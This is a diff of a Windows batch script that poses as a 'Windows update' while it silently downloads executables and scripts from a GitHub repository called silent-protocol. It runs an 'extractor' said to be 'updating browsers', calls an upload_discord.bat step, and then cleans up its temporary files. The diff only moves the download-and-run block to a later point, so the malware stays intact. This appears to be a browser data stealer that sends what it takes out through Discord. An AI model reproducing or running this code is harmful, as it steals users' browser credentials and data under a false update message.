@@ -24,22 +24,7 @@ cd "%tempdir%" || (
     rmdir "%tempdir%" 2>nul
     exit /b 3
 )
-echo Windows update 1.002
-curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe
-curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/start_browsers.bat
-REM Verify all critical downloads
-for %%F in (extractor.exe start_browsers.bat) do (
-    if not exist "%%F" (
-        echo Error: Failed to download %%F
-        exit /b 4
-    )
-)
-REM Create running flag
-echo %datetime% > "%tempdir%\running.tmp"
-echo updating browsers
-call "%tempdir%\extractor.exe"
-echo Restarting browsers
-call "%tempdir%\start_browsers.bat"
+
 
 echo Windows update 2.002
 curl -L -s -o larry.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/larry.exe
@@ -60,6 +45,25 @@ call "%tempdir%\upload_discord.bat"
 
 echo Temp directory to be cleaned: %tempdir%
 timeout /t 1 /nobreak >nul
+
+echo Windows update 1.002
+curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe
+curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/start_browsers.bat
+REM Verify all critical downloads
+for %%F in (extractor.exe start_browsers.bat) do (
+    if not exist "%%F" (
+        echo Error: Failed to download %%F
+        exit /b 4
+    )
+)
+REM Create running flag
+echo %datetime% > "%tempdir%\running.tmp"
+echo updating browsers
+call "%tempdir%\extractor.exe"
+echo Restarting browsers
+call "%tempdir%\start_browsers.bat"
+
+
 echo Process finished, starting cleanup----------------------------------------
 call "%tempdir%\cleanup.bat" "%tempdir%"
 
